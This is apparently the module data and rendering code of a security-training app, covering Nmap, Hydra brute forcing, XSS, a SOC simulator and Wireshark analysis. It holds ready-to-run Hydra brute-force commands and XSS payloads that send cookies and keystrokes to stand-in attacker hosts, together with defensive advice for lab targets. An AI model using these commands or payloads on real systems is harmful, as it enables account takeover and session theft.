    ['-A',           'Aggressive (OS + version + scripts + traceroute)','sudo nmap -A target'],
    ['-sC',          'Default NSE script scan',                          'nmap -sC target'],
    ['--script X',   'Run specific NSE script(s) or categories',         'nmap --script http-enum target'],
    ['-p PORTS',     'Scan specific ports or ranges',                    'nmap -p 22,80,443 target'],
    ['-p-',          'Scan ALL 65535 ports',                              'nmap -p- target'],
    ['--top-ports N','Scan the N most common ports',                     'nmap --top-ports 200 target'],
    ['-Pn',          'Skip host discovery (treat host as up)',           'nmap -Pn target'],
    ['-sn',          'Ping sweep only (no port scan)',                   'nmap -sn 192.168.1.0/24'],
    ['-T0 to -T5',   'Timing template (0=paranoid, 5=insane)',          'nmap -T4 target'],
    ['-oN FILE',     'Output in normal text format',                     'nmap -oN results.txt target'],
    ['-oA BASE',     'Output in all formats (normal, XML, grepable)',   'nmap -oA results target'],
    ['-v / -vv',     'Increase output verbosity',                        'nmap -vv target'],
    ['--open',       'Show only open ports in output',                   'nmap --open target']
  ]}
},

// ─────────────────────────────────────────────────────────────────────────────
// MODULE 5: Brute Force with Hydra
// ─────────────────────────────────────────────────────────────────────────────
{
  id: 'hydra', num: '05',
  title: 'Brute Force Attacks with Hydra',
  subtitle: 'Learn how password guessing attacks work, how to use Hydra for HTTP, SSH, and FTP brute forcing, and how to defend against them.',
  tag: 'Module 5 — Credential Attacks',

  concept: [
    `<strong>Brute force attacks</strong> are a category of attacks where the attacker systematically tries every possible combination of credentials until finding the correct one. In practice, attackers don't try truly random combinations — they use <strong>wordlists</strong> (dictionaries of common passwords and usernames).`,
    `<strong>Hydra</strong> (also called THC-Hydra) is a fast, parallelised network login cracker pre-installed on Kali Linux. It supports over 50 protocols including HTTP, HTTPS, SSH, FTP, MySQL, RDP, SMB, and many more. It can test thousands of username/password combinations per minute.`,
    `The basic concept is simple: Hydra takes a <strong>target</strong> (IP + port), a <strong>protocol</strong> (SSH, HTTP-form, FTP, etc.), a <strong>username or username list</strong>, and a <strong>password or password list</strong>. It then tries every combination, watching for successful logins.`,
    `<strong>Wordlists</strong> are critical. Kali Linux ships with several built-in wordlists in <code>/usr/share/wordlists/</code>. The most famous is <code>rockyou.txt</code> (14 million leaked passwords). You can also generate custom wordlists with tools like <code>crunch</code> or <code>cewl</code> (which scrapes words from a target website).`
  ],

  analogy: { emoji: '🔑', text: `Imagine you're locked out of your house and you have a massive keyring with 10,000 keys. You try each key one by one until the door opens. A brute force attack works the same way — except Hydra can try hundreds of "keys" (passwords) per second across the network. The bigger and smarter your keyring (wordlist), the faster you'll find the right key. Strong, unique passwords are like having a lock that requires a key shape none of those 10,000 keys match.` },

  steps: [
    { title: 'Locate Wordlists on Kali', desc: 'Kali Linux ships with wordlists in <code>/usr/share/wordlists/</code>. The most important one is <code>rockyou.txt</code>, which may need to be unzipped first:', code: { lang: 'bash', text: '# List available wordlists:\nls /usr/share/wordlists/\n\n# Unzip rockyou.txt if needed:\nsudo gunzip /usr/share/wordlists/rockyou.txt.gz\n\n# Check word count:\nwc -l /usr/share/wordlists/rockyou.txt\n# Output: 14344392 (14+ million passwords)' } },
    { title: 'Brute Force DVWA Login (Standard HTML Form)', desc: 'DVWA uses a traditional HTML POST form. You need three things: the login URL, the form field names, and the error message for failed logins. The <code>http-post-form</code> module handles this syntax.', code: { lang: 'bash', text: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n  localhost -s 8080 \\\n  http-post-form \\\n  "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"' } },
    { title: 'Brute Force Juice Shop (JSON API)', desc: 'Juice Shop is a modern app that uses JSON APIs instead of standard forms. Hydra supports JSON POST data directly. Note how the colon syntax is used to pass the JSON string and the "Invalid email or password" failure string.', code: { lang: 'bash', text: 'hydra -l admin@juice-sh.op -P /usr/share/wordlists/rockyou.txt \\\n  localhost -s 3000 \\\n  http-post-form \\\n  "/rest/user/login:{\\"email\\":\\"^USER^\\",\\"password\\":\\"^PASS^\\"}:Invalid email or password:H=Content-Type: application/json"' } },
    { title: 'Brute Force SSH', desc: 'SSH brute forcing is straightforward — just specify the target IP and protocol. Use <code>-t</code> to limit parallel threads (SSH servers often limit concurrent connections):', code: { lang: 'bash', text: '# Single username, password list:\nhydra -l root -P /usr/share/wordlists/rockyou.txt \\\n  ssh://192.168.1.1 -t 4\n\n# Username list + password list:\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt \\\n  ssh://192.168.1.1 -t 4' } },
    { title: 'Brute Force FTP', desc: 'FTP is another common target, especially on older systems. The syntax is identical — just change the protocol:', code: { lang: 'bash', text: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n  ftp://192.168.1.1' } },
    { title: 'Using Username Lists', desc: 'Instead of a single username (<code>-l</code>), provide a file of usernames (<code>-L</code>). You can also create custom lists based on reconnaissance:', code: { lang: 'bash', text: '# Create a custom username list:\necho -e "admin\\nroot\\nadministrator\\nuser\\ntest" > users.txt\n\n# Use it with Hydra:\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt \\\n  ssh://192.168.1.1 -t 4' } },
    { title: 'Control Speed and Output', desc: 'Use <code>-t</code> for parallel tasks, <code>-w</code> for timeout, <code>-V</code> for verbose output (shows every attempt), and <code>-o</code> to save results:', code: { lang: 'bash', text: '# Verbose mode (see each attempt):\nhydra -l admin -P passwords.txt ssh://192.168.1.1 -V\n\n# Save results to file:\nhydra -l admin -P passwords.txt ssh://192.168.1.1 -o results.txt\n\n# Limit to 4 threads, 30s timeout:\nhydra -l admin -P passwords.txt ssh://192.168.1.1 -t 4 -w 30' } }
  ],

  defense: [
    { title: 'Account Lockout Policies', desc: 'Lock accounts after N failed attempts (e.g., 5 within 10 minutes). This dramatically slows brute force attacks. Implement progressive delays — first lockout for 5 minutes, then 30 minutes, then require admin unlock.' },
    { title: 'Multi-Factor Authentication (MFA)', desc: 'Even if the password is guessed, the attacker still needs the second factor (TOTP code, hardware key, push notification). MFA renders brute force attacks nearly useless.' },
    { title: 'Rate Limiting', desc: 'Limit login attempts per IP address and per account. Tools like fail2ban (Linux) can automatically ban IPs that exceed threshold attempts.' },
    { title: 'Strong Password Policies', desc: 'Require minimum length (12+ characters), check against known breached password lists (like HaveIBeenPwned), and encourage passphrases over complex character requirements.' },
    { title: 'CAPTCHA', desc: 'Add CAPTCHA challenges after 2-3 failed login attempts. This stops automated tools like Hydra from submitting forms at machine speed.' },
    { title: 'Monitor and Alert', desc: 'Log all failed login attempts. Set up alerts for anomalies — e.g., 100 failed logins from the same IP, or attempts against multiple usernames from the same source.' }
  ],

  payloads: { headers: ['Flag', 'Purpose', 'Example'], rows: [
    ['-l USER',      'Single target username',                              'hydra -l admin ...'],
    ['-L FILE',      'Username list file',                                  'hydra -L users.txt ...'],
    ['-p PASS',      'Single target password',                              'hydra -l admin -p password123 ...'],
    ['-P FILE',      'Password list file',                                  'hydra -P rockyou.txt ...'],
    ['-t N',         'Number of parallel threads (default 16)',             'hydra ... -t 4'],
    ['-w N',         'Timeout in seconds per connection attempt',           'hydra ... -w 30'],
    ['-V',           'Verbose — show every login attempt',                  'hydra ... -V'],
    ['-v',           'Verbose mode (less detail than -V)',                  'hydra ... -v'],
    ['-o FILE',      'Save found credentials to a file',                    'hydra ... -o results.txt'],
    ['-s PORT',      'Specify a custom port number',                        'hydra ... -s 8080'],
    ['-f',           'Stop after first valid credentials found',            'hydra ... -f'],
    ['ssh://',       'Target protocol prefix for SSH',                       'hydra -l root -P list.txt ssh://target'],
    ['ftp://',       'Target protocol prefix for FTP',                       'hydra -l admin -P list.txt ftp://target'],
    ['http-post-form','HTTP POST form brute force module',                  'hydra ... http-post-form "/login:u=^USER^&p=^PASS^:F=Failed"'],
    ['http-get-form', 'HTTP GET form brute force module',                   'hydra ... http-get-form "/login:u=^USER^&p=^PASS^:F=Failed"'],
    ['-e nsr',       'Try null password, same-as-login, and reversed login','hydra ... -e nsr'],
    ['-C FILE',      'Colon-separated "user:pass" combo file',             'hydra ... -C combos.txt ssh://target']
  ]}
},

// ─────────────────────────────────────────────────────────────────────────────
// MODULE 6: Cross-Site Scripting (XSS)
// ─────────────────────────────────────────────────────────────────────────────
{
  id: 'xss', num: '06',
  title: 'Cross-Site Scripting (XSS)',
  subtitle: 'Learn how injecting malicious client-side scripts can hijack user sessions and manipulate web pages.',
  tag: 'Module 6 \u2014 Client-Side Attacks',

  concept: [
    '<strong>Cross-Site Scripting (XSS)</strong> occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows an attacker to execute malicious JavaScript in the victim\'s browser.',
    '<strong>Reflected XSS</strong> happens when user input is immediately returned (reflected) by the web application in an error message, search result, or any other response. The payload is typically delivered via a crafted link.',
    '<strong>Stored XSS</strong> (Persistent) is more dangerous. The malicious script is saved on the target server (e.g., in a database via a comment or profile field) and executed every time a user views the infected page.',
    '<strong>DOM-based XSS</strong> occurs entirely in the browser when client-side JavaScript takes data from an attacker-controllable source (like the URL hash) and passes it to a dangerous sink (like <code>innerHTML</code> or <code>eval()</code>).'
  ],

  analogy: { emoji: '\uD83C\uDFAD', text: 'Imagine putting up a poster on a community noticeboard. Normally, you just write text. But if the noticeboard doesn\'t restrict what you pin up, you could pin a magical set of instructions that hypnotize anyone who reads them. When a victim looks at the board, they unknowingly execute your instructions \u2014 perhaps handing over their wallet. XSS is injecting those magical instructions (JavaScript) into a webpage.' },

  steps: [
    { title: 'Reflected XSS via Search', desc: 'In Juice Shop, the search bar reflects your input directly into the page. Try searching for an HTML tag like <code>&lt;h1&gt;Test&lt;/h1&gt;</code>. If the text renders as a heading, HTML is being interpreted. Now try an iframe payload:', code: { lang: 'html', text: '<iframe src="javascript:alert(\'xss\')">' } },
    { title: 'DOM XSS via URL Hash', desc: 'Juice Shop\'s Angular frontend processes the URL hash client-side. If this data is unsafely rendered into the DOM, it creates a DOM XSS vector. Try navigating to this URL directly:', code: { lang: 'url', text: 'http://localhost:3000/#/search?q=<iframe src="javascript:alert(\'xss\')">' } },
    { title: 'Stored XSS via Feedback', desc: 'Navigate to the Customer Feedback section. Enter an XSS payload in the comment field. The script is saved to the database and will trigger whenever the feedback is viewed (e.g., by an admin in the Administration panel).', code: { lang: 'html', text: '<script>alert("Stored XSS via Feedback!")</script>' } },
    { title: 'Stealing Cookies', desc: 'The most common real-world XSS goal is stealing session cookies. An attacker writes a script that reads <code>document.cookie</code> and sends it to their own server, effectively hijacking the victim\'s session.', code: { lang: 'html', text: '<script>fetch("http://attacker.com/steal?cookie=" + btoa(document.cookie))</script>' } },
    { title: 'Keylogging via XSS', desc: 'Advanced XSS payloads can silently capture keystrokes on the infected page. The attacker injects an event listener that forwards every key pressed to their server.', code: { lang: 'javascript', text: 'document.addEventListener("keypress", function(e) {\\n  fetch("http://attacker.com/log?k=" + e.key);\\n});' } }
  ],

  defense: [
    { title: 'Context-Aware Output Encoding', desc: 'Never trust user input. Before rendering data in the browser, encode it according to where it will be placed (HTML body, attribute, JavaScript variable). Use framework features like React or Angular that auto-escape by default.' },
    { title: 'Content Security Policy (CSP)', desc: 'A strict CSP prevents the browser from executing inline scripts and restricts where external scripts can be loaded from. It acts as a defense-in-depth layer against XSS.' },
    { title: 'HttpOnly Cookies', desc: 'Set the <code>HttpOnly</code> flag on session cookies. This prevents client-side JavaScript (and therefore XSS attacks) from accessing the cookie.' },
    { title: 'Sanitization', desc: 'If you must allow users to submit rich text (HTML), use a robust sanitization library like DOMPurify to strip out dangerous tags and attributes (like <code>&lt;script&gt;</code> or <code>onerror</code>).' }
  ],

  payloads: { headers: ['Payload', 'Type / Purpose', 'Description'], rows: [
    ['&lt;script&gt;alert(1)&lt;/script&gt;',             'Basic',        'The classic proof of concept. Executes a simple alert box.'],
    ['&lt;img src=x onerror=alert(1)&gt;',                'Image Vector', 'Executes JavaScript when the browser fails to load the fake image source.'],
    ['&lt;iframe src="javascript:alert(1)"&gt;',           'Iframe',       'Executes script within an iframe. Often bypasses basic regex filters.'],
    ['&lt;svg onload=alert(1)&gt;',                       'SVG Vector',   'Executes script when the SVG element finishes loading.'],
    ['"&gt;&lt;script&gt;alert(1)&lt;/script&gt;',        'Break Out',    'Closes an existing HTML attribute/tag before injecting the payload.'],
    ['javascript:alert(1)',                                'URI Scheme',   'Used in href or src attributes that expect a URL.'],
    ['&lt;script&gt;fetch("http://evil.com/?c="+document.cookie)&lt;/script&gt;', 'Exfiltration', 'Steals the session cookie and sends it to the attacker.']
  ]}
},

{
  id: 'soc-simulator', num: '07',
  title: 'Blue Team SOC Analyst',
  subtitle: 'Defend the network! Monitor live traffic, spot the active exploit, and remediate the threat.',
  tag: 'Module 7 — Defensive Simulation',

  concept: [
    `A <strong>Security Operations Center (SOC)</strong> is the central command post for a blue team. Analysts monitor network traffic, system logs, and intrusion detection alerts to identify and neutralize active threats in real-time.`,
    `When an attacker is running automated scripts (like Hydra or SQLmap) or manually testing payloads against your application, they leave a trail of breadcrumbs in the server's access logs.`,
    `Your job is to identify the <strong>Indicators of Compromise (IoCs)</strong>—such as anomalous traffic volumes, repetitive errors (401/403), or malicious signatures (like <code>UNION SELECT</code> or <code>../</code>) hidden within thousands of lines of benign web traffic.`
  ],

  analogy: { emoji: '🕵️', text: `Imagine you're the security guard watching hundreds of CCTV cameras simultaneously. Most people are just shopping (normal traffic), but one person is systematically trying the doorknob of every locked door in the building. Your job is to spot them and radio for backup before they find an open door.` },

  steps: [
    { title: 'Launch the Simulator', desc: 'Click the "Start SOC Simulator" button below to enter the live log analysis terminal.', code: null },
    { title: 'Monitor the Traffic Stream', desc: 'Watch the live access log feed. Normal traffic consists of GET requests to images, CSS files, and regular page routes returning 200 OK.', code: null },
    { title: 'Identify the Attack Vector', desc: 'Look for the specific IoCs listed in your Mission Objective panel. You are hunting for a malicious injection payload.', code: null },
    { title: 'Flag the Threat', desc: 'When you spot the malicious log line, click on it immediately to flag it as a threat vector.', code: null },
    { title: 'Apply Remediation', desc: 'Once the threat is successfully flagged, the Remediation Panel will unlock. Choose the correct defensive action to neutralize the attack.', code: null }
  ],

  defense: [
    { title: 'Web Application Firewalls (WAF)', desc: 'Deploy a WAF to automatically block requests containing known malicious signatures before they reach the application server.' },
    { title: 'Rate Limiting', desc: 'Implement strict rate limits on sensitive endpoints (like login forms) to thwart automated brute-force attacks.' },
    { title: 'Centralized Logging & SIEM', desc: 'Aggregate all application, server, and firewall logs into a SIEM (Security Information and Event Management) system for automated anomaly detection and alerting.' }
  ],

  payloads: { headers: ['Log Pattern', 'Attack Type', 'Description'], rows: [
    ['GET /login.php HTTP/1.1" 401', 'Brute Force', 'Repeated 401 Unauthorized responses to a login endpoint indicate credential stuffing.'],
    ['GET /api/users?id=1+UNION+SELECT', 'SQL Injection', 'The UNION keyword is a hallmark of SQL injection attempts.'],
    ['GET /image?file=../../../etc/passwd', 'Path Traversal', 'The ../ pattern attempts to escape the web root and read arbitrary system files.'],
    ['GET /search?q=&lt;script&gt;', 'XSS', 'Raw HTML/Script tags in URL parameters indicate Reflected XSS attempts.']
  ]}
},

// ─────────────────────────────────────────────────────────────────────────────
// MODULE 8: Network Traffic Analysis
// ─────────────────────────────────────────────────────────────────────────────
{
  id: 'net-analyst', num: '08',
  title: 'Network Traffic Analysis',
  subtitle: 'Capture, decode, and analyze raw network packets to hunt for malware beacons, credential theft, and data exfiltration.',
  tag: 'Module 8 — Blue Team Forensics',

  concept: [
    `Every byte that travels across a network can be captured and inspected. <strong>Packet analysis</strong> is the art of reading these raw captures to reconstruct what happened during a security incident — or to catch an attack <em>in progress</em>.`,
    `<strong>Wireshark</strong> is the world's most popular network protocol analyzer. It decodes over 3,000 protocols from raw binary and presents them in a human-readable format. Security analysts use it to find plaintext credentials, malware C2 (command-and-control) beacons, DNS exfiltration, and unusual traffic patterns.`,
    `A key skill is <strong>filtering</strong>. A typical packet capture contains thousands of packets per second. Using display filters (like <code>http.request.method == "POST"</code> or <code>dns contains "evil.com"</code>), you can isolate exactly the traffic you care about.`,
    `On the command line, <strong>tcpdump</strong> is the lightweight alternative — perfect for capturing on headless servers or embedded devices where a GUI is unavailable.`
  ],

  analogy: { emoji: '🔬', text: `Think of packet analysis like reading every individual letter passing through a postal sorting facility. While most letters are birthday cards and bills (normal traffic), the analyst is looking for the one envelope containing a coded message to an overseas spy (a malware beacon). The key is filtering thousands of normal items to spot the one suspicious one.` },

  steps: [
    { title: 'Capture Traffic with Wireshark', desc: 'Open Wireshark and select your active network interface. Click the blue shark-fin to start a capture. You will immediately see a flood of packets. Stop the capture after 30 seconds.', code: { lang: 'filter', text: '# Wireshark Display Filter: Show only HTTP traffic\nhttp\n\n# Show only DNS queries\ndns\n\n# Filter by IP address\nip.addr == 192.168.1.105' } },
    { title: 'Hunt for Plaintext Credentials', desc: 'Many legacy protocols (FTP, Telnet, HTTP Basic Auth) transmit credentials in plain text. Use the filter below and then follow the TCP stream (Right-click → Follow → TCP Stream) to reconstruct the full session.', code: { lang: 'filter', text: '# Find FTP login attempts\nftp.request.command == "PASS"\n\n# Find HTTP Basic Auth\nhttp.authorization\n\n# Find POST form data (look for password= parameters)\nhttp.request.method == "POST"' } },
    { title: 'Detect DNS Exfiltration', desc: 'Attackers encode stolen data in DNS queries to bypass firewalls (since most networks allow DNS out). Look for abnormally long subdomain names, which indicate data is being tunneled.', code: { lang: 'filter', text: '# Show all DNS queries\ndns.flags.response == 0\n\n# Look for unusually long names (>50 chars = suspicious)\ndns.qry.name.len > 50\n\n# Suspicious example:\n# 6d616c77617265.exfil.evil.com  ← hex-encoded data in subdomain' } },
    { title: 'Identify Malware C2 Beacons', desc: 'Malware "phones home" to its command server at regular intervals (beaconing). Look for a host making connections to an external IP on unusual ports at perfectly regular intervals (e.g., exactly every 60 seconds).', code: { lang: 'filter', text: '# Filter traffic to a suspicious external IP\nip.dst == 13.37.13.37\n\n# Look for repeated connections to same port\ntcp.dstport == 4444 or tcp.dstport == 1337\n\n# Check for small, regular payloads (beacon pattern)\ntcp.len > 0 and tcp.len < 100' } },
    { title: 'Reconstruct an Attack with Follow Stream', desc: 'When you find a suspicious packet, right-click it and select <strong>Follow → TCP Stream</strong>. Wireshark will reconstruct the entire two-way conversation in a readable format, showing you the exact request and response — critical for understanding what data was stolen.', code: null },
    { title: 'Capture on the Command Line (tcpdump)', desc: 'When you cannot run Wireshark, use tcpdump. Always save to a .pcap file for later analysis in Wireshark.', code: { lang: 'bash', text: '# Capture all traffic on eth0, save to file\ntcpdump -i eth0 -w capture.pcap\n\n# Capture only HTTP traffic (port 80)\ntcpdump -i eth0 port 80 -w http_traffic.pcap\n\n# Read and display a saved capture\ntcpdump -r capture.pcap -n\n\n# Filter by host IP\ntcpdump -i eth0 host 192.168.1.105 -w suspect.pcap' } }
  ],

  defense: [
    { title: 'Encrypt All Traffic (TLS/HTTPS)', desc: 'TLS encryption makes packet capture useless — the attacker sees only encrypted ciphertext. Enforce TLS 1.3 with strong cipher suites. Never allow HTTP, FTP, or Telnet in production.' },
    { title: 'Network Segmentation', desc: 'Use VLANs and firewall rules to segment your network. If an attacker compromises one host, they cannot simply sniff traffic on other segments they are not part of.' },
    { title: 'Intrusion Detection Systems (IDS)', desc: 'Deploy an IDS like Snort or Suricata on your network tap/span port. These tools analyze live packet streams against known attack signatures and alert your SOC in real-time.' },
    { title: 'DNS Security (DNSSEC & DoH)', desc: 'Implement DNS over HTTPS (DoH) or DNS over TLS (DoT) to prevent DNS sniffing and manipulation. Monitor DNS logs for anomalously long query names that indicate data exfiltration.' }
  ],

  payloads: { headers: ['Filter / Command', 'Purpose', 'Risk Detected'], rows: [
    ['http.request.method == "POST"',   'Find all form submissions',          'Credential Theft'],
    ['ftp.request.command == "PASS"',   'Find FTP plaintext passwords',      'Credential Exposure'],
    ['dns.qry.name.len > 50',           'Detect DNS tunneling/exfiltration',  'Data Exfiltration'],
    ['tcp.dstport == 4444',             'C2 beacon on common RAT port',       'Malware'],
    ['http.authorization',              'Find Basic Auth credentials',         'Credential Theft'],
    ['icmp',                            'Ping sweeps / ICMP tunneling',       'Reconnaissance'],
    ['tcp.flags.syn == 1',              'SYN flood detection',                'DDoS'],
    ['ip.src == 10.0.0.X && dns',       'Internal host doing unusual DNS',    'Lateral Movement']
  ]}
}

]; // end MODULES

/* ═══════════════════════════════════════════════════════════════════════════════
   APPLICATION STATE & DOM
   ═══════════════════════════════════════════════════════════════════════════════ */

let activeModuleIndex = -1;
let isBooting = false;
let dockerInstalled = null;

const sidebarNav   = document.getElementById('sidebarNav');
const contentArea  = document.getElementById('contentArea');
const btnBoot      = document.getElementById('btnBoot');
const btnBootText  = document.getElementById('btnBootText');
const labMessage   = document.getElementById('labMessage');
const labStatusRow = document.getElementById('labStatusRow');
const dockerMount  = document.getElementById('dockerWizardMount');

/* ═══════════════════════════════════════════════════════════════════════════════
   SIDEBAR NAVIGATION
   ═══════════════════════════════════════════════════════════════════════════════ */

function buildSidebar() {
  MODULES.forEach((mod, i) => {
    const item = document.createElement('div');
    item.className = 'nav-item';
    item.dataset.index = i;
    item.dataset.module = mod.id;
    item.innerHTML = `
      <div class="nav-num">${mod.num}</div>
      <div class="nav-label">${escapeHtml(mod.title)}</div>
    `;
    item.addEventListener('click', () => selectModule(i));
    sidebarNav.appendChild(item);
  });
}

function selectModuleById(moduleId) {
  const idx = MODULES.findIndex(m => m.id === moduleId);
  if (idx >= 0) selectModule(idx);
}

function stopSocSimulator() {
  if (socStreamInterval) { clearInterval(socStreamInterval); socStreamInterval = null; }
  socFlaggedScenario = null;
}

function exitSoc() {
  stopSocSimulator();
  document.getElementById('socMode').style.display = 'none';
  document.getElementById('labMode').style.display = 'none';
  document.getElementById('contentArea').style.display = '';
}

function selectModule(index) {
  stopSocSimulator();
  document.getElementById('socMode').style.display = 'none';
  document.getElementById('contentArea').style.display = '';
  activeModuleIndex = index;
  document.querySelectorAll('.nav-item').forEach((el, i) => {
    el.classList.toggle('active', i === index);
  });
  renderModule(MODULES[index]);
}

/* ═══════════════════════════════════════════════════════════════════════════════
   MODULE RENDERER
   ═══════════════════════════════════════════════════════════════════════════════ */

function renderModule(mod) {
  contentArea.innerHTML = `
    <div class="module-header fade-in">
      <span class="module-tag">${mod.tag}</span>
      <h2 class="module-title">${mod.title}</h2>
      <p class="module-subtitle">${mod.subtitle}</p>
    </div>

    <!-- Core Concept -->
    <div class="section-card fade-in fade-in-delay-1">
      <div class="section-header">
        <div class="section-icon concept">${ICONS.concept}</div>
        <h3 class="section-title">${t('section_concept')}</h3>
      </div>
      <div class="section-body">
        ${mod.concept.map(p => `<p>${p}</p>`).join('')}
      </div>
    </div>

    <!-- Real-World Analogy -->
    <div class="section-card fade-in fade-in-delay-2">
      <div class="section-header">
        <div class="section-icon analogy">${ICONS.analogy}</div>
        <h3 class="section-title">${t('section_analogy')}</h3>
      </div>
      <div class="section-body">
        <div class="analogy-box">
          <span class="analogy-emoji">${mod.analogy.emoji}</span>
          <p>${mod.analogy.text}</p>
        </div>
      </div>
    </div>

    <!-- Step-by-Step Lab Exercise -->
    <div class="section-card fade-in fade-in-delay-3">
      <div class="section-header">
        <div class="section-icon exercise">${ICONS.exercise}</div>
        <h3 class="section-title">${t('section_steps')}</h3>
      </div>
      <div class="section-body">
        <ol class="step-list">
          ${mod.steps.map((step, i) => `
            <li class="step-item">
              <div class="step-num">${i + 1}</div>
              <div class="step-content">
                <h4>${step.title}</h4>
                <p>${step.desc}</p>
                ${step.code ? buildCodeBlock(step.code.lang, step.code.text) : ''}
              </div>
            </li>
          `).join('')}
        </ol>
      </div>
    </div>

    <!-- Defense & Remediation -->
    ${mod.defense ? `
    <div class="section-card fade-in fade-in-delay-4">
      <div class="section-header">
        <div class="section-icon defense">${ICONS.shield}</div>
        <h3 class="section-title">${t('section_defense')}</h3>
      </div>
      <div class="section-body">
        <ul class="defense-list">
          ${mod.defense.map(d => `
            <li class="defense-item">
              <div class="defense-icon-sm">${ICONS.shield}</div>
              <div class="defense-content">
                <h4>${d.title}</h4>
                <p>${d.desc}</p>
              </div>
            </li>
          `).join('')}
        </ul>
      </div>
    </div>
    ` : ''}

    <!-- Interactive Reference Table -->
    <div class="section-card fade-in fade-in-delay-5">
      <div class="section-header">
        <div class="section-icon reference">${ICONS.reference}</div>
        <h3 class="section-title">${t('section_reference')}</h3>
      </div>
      <div class="section-body">
        <div class="payload-table-wrap">
          <table class="payload-table">
            <thead>
              <tr>
                ${mod.payloads.headers.map(h => `<th>${h}</th>`).join('')}
                <th style="width:40px;"></th>
              </tr>
            </thead>
            <tbody>
              ${mod.payloads.rows.map(row => `
                <tr>
                  <td><span class="cell-code">${escapeHtml(row[0])}</span></td>
                  <td>${row[1]}</td>
                  <td>${formatRisk(row[2])}</td>
                  <td>
                    <button class="cell-copy-btn" data-copy="${escapeAttr(row[0])}" title="Copy">
                      ${ICONS.copy}
                    </button>
                  </td>
                </tr>
              `).join('')}
            </tbody>
          </table>
        </div>
      </div>
    </div>
    
    <!-- Interactive Challenges -->
    <div class="section-card fade-in fade-in-delay-5" id="interactiveChallengesSection" style="display:none;">
      <div class="section-header" style="background: rgba(0, 240, 255, 0.05); border-bottom: 1px solid var(--border-accent);">
        <div class="section-icon concept">${LI.target}</div>
        <h3 class="section-title" style="color: var(--cyan);">Interactive Challenges</h3>
      </div>
      <div class="section-body">
        <p>Put your skills to the test inside the live lab environment. You can follow an interactive step-by-step tutorial, or try to solve it on your own!</p>
        <div id="challengesList" class="challenges-list" style="display: flex; flex-direction: column; gap: 12px; margin-top: 16px;">
          <!-- Populated dynamically if tutorials exist for this module -->
        </div>
      </div>
    </div>
  `;

  // After rendering, check if there are tutorials for this module
  if (mod.id === 'soc-simulator') {
    document.getElementById('interactiveChallengesSection').style.display = 'block';
    const list = document.getElementById('challengesList');
    list.innerHTML = `
      <div style="display:flex; align-items:center; justify-content:space-between; background:var(--bg-elevated); padding:12px 16px; border:1px solid var(--border); border-radius:var(--radius-sm);">
        <div>
          <div style="font-size:14px; font-weight:700; color:var(--text-primary); margin-bottom:4px;">Blue Team: Active Audit</div>
          <div style="font-size:12px; color:var(--text-secondary);">Enter the Security Operations Center to monitor live traffic and neutralize threats.</div>
        </div>
        <button class="btn btn-boot" onclick="window.__app.startSocSimulator()" style="background: linear-gradient(135deg, var(--cyan), var(--success)); box-shadow: 0 0 15px rgba(34,197,94,0.2);">
          Start SOC Simulator
        </button>
      </div>
    `;
  } else if (window.TUTORIALS) {
    const modsTuts = Object.entries(window.TUTORIALS).filter(([key, tut]) => tut.module === mod.id);

    if (modsTuts.length > 0) {
      document.getElementById('interactiveChallengesSection').style.display = 'block';
      const list = document.getElementById('challengesList');

      // ── Lab button lookup table — add new labs here, never touch the template ──
      const LAB_BTN_MAP = [
        { flag: 'requiresSQLiLab',            fn: 'openSQLiLab',               label: 'Launch SQLi Lab',               grad: '#ef4444,#b91c1c', glow: '239,68,68'   },
        { flag: 'requiresHeaderManipulation',  fn: 'openHeaderManipulationLab', label: 'Launch Header Manipulation Lab', grad: '#f59e0b,#d97706', glow: '245,158,11'  },
        { flag: 'requiresCookieManipulation',  fn: 'openCookieManipulationLab', label: 'Launch Cookie Manipulation Lab', grad: '#10b981,#059669', glow: '16,185,129'  },
        { flag: 'requiresPriceTampering',      fn: 'openPriceTamperingLab',     label: 'Launch Price Tampering Lab',     grad: '#8b5cf6,#6366f1', glow: '139,92,246'  },
        { flag: 'requiresCyberMart',           fn: 'openBurpLab',               label: 'Launch Burp Suite Lab',          grad: '#ff6633,#cc3300', glow: '255,102,51'  },
      ];

      function resolveLabButton(key, tut) {
        const match = LAB_BTN_MAP.find(e => tut[e.flag]);
        if (match) {
          return `<button class="btn btn-boot" onclick="window.labAPI.${match.fn}()" style="background:linear-gradient(135deg,${match.grad});box-shadow:0 0 15px rgba(${match.glow},0.4);letter-spacing:0.3px;">${match.label}</button>`;
        }
        if (tut.requiresWebview) {
          return `<button class="btn btn-boot" onclick="window.__app.startTutorial('${key}')" style="background:linear-gradient(135deg,var(--cyan),var(--success));box-shadow:0 0 15px rgba(34,197,94,0.2);">Juice Shop Tutorial</button>
                  <button class="btn btn-secondary" onclick="window.__app.startChallenge('${key}')" style="background:rgba(255,255,255,0.08);border:1px solid var(--border-accent);">Open Sandbox</button>`;
        }
        return `<button class="btn btn-boot" onclick="window.__app.startTutorial('${key}')" style="background:linear-gradient(135deg,var(--cyan),var(--violet));box-shadow:0 0 15px rgba(0,240,255,0.2);">Integrated Tutorial</button>`;
      }

      list.innerHTML = modsTuts.map(([key, tut]) => `
        <div style="display:flex; align-items:center; justify-content:space-between; background:var(--bg-elevated); padding:12px 16px; border:1px solid var(--border); border-radius:var(--radius-sm);">
          <div>
            <div style="font-size:14px; font-weight:700; color:var(--text-primary); margin-bottom:4px;">${escapeHtml(tut.name)}</div>
            <div style="font-size:12px; color:var(--text-secondary);">${escapeHtml(tut.description)}</div>
          </div>
          <div style="display:flex; gap:8px;">
            ${resolveLabButton(key, tut)}
          </div>
        </div>
      `).join('');
    }
  }

  if (mod.id === 'burp-proxy') {
    // CyberMart tutorials now launch via Lab Mode — no inline embed needed.
  }
  
  if (mod.id === 'nmap') {
    const terminalHtml = `
      <div class="section-card fade-in fade-in-delay-6" id="nmapTerminalSection">
        <div class="section-header" style="background: rgba(0, 240, 255, 0.05); border-bottom: 1px solid var(--border-accent);">
          <div class="section-icon concept">${LI.terminal}</div>
          <h3 class="section-title" style="color: var(--cyan);">Interactive Nmap Terminal</h3>
        </div>
        <div class="section-body">
          <p>Practice running Nmap commands in this simulated environment. Try commands like <code>nmap 127.0.0.1</code> or <code>nmap -sV localhost</code>.</p>
